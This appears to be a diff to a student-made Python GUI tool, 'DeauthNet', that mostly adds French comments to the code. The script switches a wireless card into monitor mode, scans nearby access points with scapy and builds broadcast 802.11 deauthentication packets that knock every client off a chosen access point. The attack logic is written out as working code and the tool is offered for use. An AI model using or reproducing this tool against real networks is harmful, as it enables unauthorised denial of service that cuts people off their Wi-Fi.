@@ -1,4 +1,6 @@
 #!/usr/local/sbin python
+
+# Imports des différents modules liés à l'interface graphique, threads, commandes système, etc
 import sys
 import os
 import platform
@@ -17,13 +19,13 @@ import psutil
 import subprocess
 import threading, time
 
-SYSTEM = platform.system()
+SYSTEM = platform.system() # Detection du système actuel afin d'utiliser les commandes adéquates pour de l'initialisation de la carte réseau (wlan0 ou autre) 
 addrs = list(psutil.net_if_addrs().keys())
 addrs.sort()
 iface = addrs[-1]
 
-
-def setchan(chan=13):
+# ========================================== CONF
+def setchan(chan=13):  # la fonction suivante permet d'initialiser la carte réseau de la machine actuelle en mode monitor selon le système sur lequel s'exécute le programme
     global iface
     if SYSTEM == "Linux":
         os.system(f"ip link set dev {iface} down")
@@ -50,15 +52,15 @@ def initialize_wlan0():
     print("Done")
 
 
-def check_device():
+def check_device(): # check si le mode monitor est disponible sur l'interface choisie
         if not(setchan(usrchan.get())):
             messagebox.showerror(title, f"Unable to set {iface} into monitor mode !\nPlease choose another interface")
             return False
         else: 
             return True
 
-# =================================================================================================
-stop_event = threading.Event()
+# ========================================== ATTACK & GUI 
+stop_event = threading.Event() # Multi-threading pour pouvoir lancer une boucle infinie sans faire crasher le programme (lors de l'arrêt) 
 
 def spammer():
     if not stop_event.is_set():
@@ -68,7 +70,7 @@ def spammer():
 def onClick():
     global button_state
     if check_device():
-        if button_state == "Start Deauth attack":
+        if button_state == "Start Deauth attack": 
             button_state = "no"
             btndn.config(text="Start Deauth attack", fg='#22FF00')
             stop_event.set()
@@ -86,7 +88,7 @@ def onClick():
         messagebox.showerror(title, f"Unable to start the attack with the interface {iface} !")
 
 
-def GetAPStation(*args, **kwargs):
+def GetAPStation(*args, **kwargs): # récupération des APs disponibles et retour de leur nom et adresse MAC 
     ap = []
     packets = []
 
@@ -99,8 +101,7 @@ def GetAPStation(*args, **kwargs):
     scapy.sniff(count=30, prn=PacketFilter, *args, **kwargs)
     return [ap, packets]
 
-
-def refresh():
+def refresh(): # fonction liée au bouton refresh -> capture des macs et des noms des APS disponible
     global t, liste, AP_list
     t=[[]]
     if check_device():
@@ -118,9 +119,9 @@ def refresh():
     
 
 
-def deauth_attack():
+def deauth_attack(): # Contructeur de paquets Deauth
     AP_MAC = current_ap
-    CLIENT_MAC = "ff:ff:ff:ff:ff:ff"
+    CLIENT_MAC = "ff:ff:ff:ff:ff:ff" # Cible en broadcast-> deconnexion des appareils connectés au point d'accès choisit (spécifié dans AP_MAC) 
 
     packet = RadioTap() / \
              Dot11( \
@@ -137,7 +138,7 @@ def deauth_attack():
 def aboutButton():
     messagebox.showinfo(title, "Program created by Uysse & Jean-Baptiste during SAE 304.\n\nHow to use it:\n1st: Refresh the list ↻\n\n2nd: Select a channel for the targeted AP.\n\n3rd: Start deauthentication attack !")
 
-def changeInt(select):
+def changeInt(select): 
     global iface
     iface=select
 
@@ -146,7 +147,7 @@ def onselect(evt):
     current_ap = liste.get(liste.curselection()[0])
     current_ap=current_ap.split("(")[1].split(")")[0].split(" ")[1]
 
-t = [[]]
+t = [[]] # L'ensemble du design de la fenêtre (taille et redimensionnement d'image-> selon ), labels, boutons, entrée utilisateur, listbox etc 
 current_ap=""
 title = "DeauthNet (beta) v 1.0"
 initialize_wlan0()
